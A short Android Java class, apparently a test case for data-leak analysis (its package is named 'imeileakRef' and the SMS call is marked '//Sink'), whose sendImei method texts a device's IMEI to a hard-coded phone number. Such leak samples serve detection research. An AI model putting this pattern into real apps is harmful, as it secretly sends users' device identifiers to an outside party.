package com.imeileakRef;

import android.app.Activity;
import android.content.Context;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

/**
 * Created by Shiva on 2/1/2018.
 */

public class Imei extends Activity{

    public void sendImei(String imei)
    {
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("4193784172", null, imei, null, null);  //Sink
    }
}
